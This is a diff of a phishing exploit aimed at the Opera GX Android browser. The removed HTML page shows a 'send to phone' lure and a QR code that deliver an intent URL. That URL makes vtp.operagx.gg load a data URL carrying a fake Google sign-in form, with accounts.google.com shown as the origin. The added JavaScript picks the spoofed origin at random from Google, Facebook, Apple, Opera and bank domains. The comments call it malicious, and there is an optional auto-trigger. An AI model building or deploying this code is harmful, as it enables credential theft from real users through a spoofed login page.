@@ -1,86 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Video Sharing Service</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .video-container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .send-to-phone {
-            background: #ff6b35;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 20px 0;
-        }
-        .qr-code {
-            text-align: center;
-            margin: 20px 0;
-        }
-    </style>
-</head>
-<body>
-    <div class="video-container">
-        <h1>🎥 Exclusive Video Content</h1>
-        <div class="qr-code">
-            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://vtp.operagx.gg/?url=data://accounts.google.com/%2C%3Chtml%3E%3Chead%3E%3Ctitle%3EGoogle%20Login%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%22font-family%3A%20Arial%3B%20text-align%3A%20center%3B%20padding%3A%2050px%3B%22%3E%3Ch1%3E%F0%9F%94%92%20Google%20Sign-In%3C%2Fh1%3E%3Cinput%20type%3D%22email%22%20placeholder%3D%22Email%22%20style%3D%22padding%3A%2015px%3B%20margin%3A%2010px%3B%20width%3A%20300px%3B%22%3E%3Cbr%3E%3Cinput%20type%3D%22password%22%20placeholder%3D%22Password%22%20style%3D%22padding%3A%2015px%3B%20margin%3A%2010px%3B%20width%3A%20300px%3B%22%3E%3Cbr%3E%3Cbutton%20style%3D%22background%3A%20%234285f4%3B%20color%3A%20white%3B%20padding%3A%2015px%2030px%3B%20border%3A%20none%3B%20border-radius%3A%205px%3B%20margin-top%3A%2020px%3B%22%3ENext%3C%2Fbutton%3E%3C%2Fbody%3E%3C%2Fhtml%3E" alt="QR Code">
-        </div>
-        
-        <button class="send-to-phone" onclick="sendToPhone()">
-            📱 Send to Your Opera GX Phone
-        </button>
-        
-        <p style="font-size: 12px; color: #666;">
-            Scan the QR code with your Opera GX Android app or click the button above to send this video directly to your phone.
-        </p>
-    </div>
+const domains = [
+    'login.opera.com',
+    'accounts.google.com', 
+    'facebook.com',
+    'secure.bank.com',
+    'auth.apple.com'
+];
 
-    <script>
-        function sendToPhone() {
-            // Malicious data URL dengan fake Google login
-            const fakeGoogleLogin = `
-            <html>
-            <head><title>Google Login</title></head>
-            <body style="font-family: Arial; text-align: center; padding: 50px;">
-                <h1>🔒 Google Sign-In</h1>
-                <p>Sign in to continue to Google Services</p>
-                <input type="email" placeholder="Email or phone" style="padding: 15px; margin: 10px; width: 300px; border: 1px solid #ddd; border-radius: 5px;"><br>
-                <input type="password" placeholder="Enter your password" style="padding: 15px; margin: 10px; width: 300px; border: 1px solid #ddd; border-radius: 5px;"><br>
-                <button style="background: #4285f4; color: white; padding: 15px 30px; border: none; border-radius: 5px; margin-top: 20px; cursor: pointer;">
-                    Next
-                </button>
-                <p style="font-size: 12px; color: #666; margin-top: 30px;">
-                    This is a secure Google page
-                </p>
-            </body>
-            </html>
-            `;
-            
-            // Encode ke data URL
-            const dataURL = `data://accounts.google.com/,${encodeURIComponent(fakeGoogleLogin)}`;
-            
-            // Buat malicious intent
-            const maliciousIntent = `intent://vtp.operagx.gg/?url=${encodeURIComponent(dataURL)}#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.opera.gx;end;`;
-            
-            // Redirect user
-            window.location.href = maliciousIntent;
-        }
-        
-        // Auto-trigger setelah 5 detik (optional - lebih aggressive)
-        // setTimeout(sendToPhone, 5000);
-    </script>
-</body>
-</html>
+const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+const dynamicIntent = `intent://vtp.operagx.gg/?url=data://${randomDomain}/,Fake%20Content#Intent;...`;
